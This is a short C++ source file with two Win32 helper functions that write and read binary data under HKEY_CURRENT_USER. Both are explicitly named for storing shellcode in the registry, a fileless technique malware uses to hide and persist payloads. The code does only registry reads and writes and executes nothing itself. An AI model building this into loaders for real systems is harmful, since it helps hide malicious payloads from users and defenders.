#include "registry_utils.h"
#include <windows.h>
#include <iostream>

bool WriteShellcodeToRegistry(const std::string& key, const std::string& valueName, const BYTE* data, DWORD dataSize) {
    HKEY hKey;
    // Try to create or open the registry key with write access
    LONG createRes = RegCreateKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (createRes != ERROR_SUCCESS) {
        std::cerr << "Failed to create or open registry key. Error code: " << createRes
            << " (Last Error: " << GetLastError() << ")\n";
        return false;
    }

    // Try to set the registry value
    LONG setRes = RegSetValueExA(hKey, valueName.c_str(), 0, REG_BINARY, data, dataSize);
    if (setRes != ERROR_SUCCESS) {
        std::cerr << "Failed to write to registry. Error code: " << setRes
            << " (Last Error: " << GetLastError() << ")\n";
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

bool ReadShellcodeFromRegistry(const std::string& key, const std::string& valueName, BYTE* buffer, DWORD bufferSize) {
    HKEY hKey;
    DWORD type = REG_BINARY;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key for reading.\n";
        return false;
    }

    if (RegGetValueA(hKey, NULL, valueName.c_str(), RRF_RT_REG_BINARY, &type, buffer, &bufferSize) != ERROR_SUCCESS) {
        std::cerr << "Failed to read from registry.\n";
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}
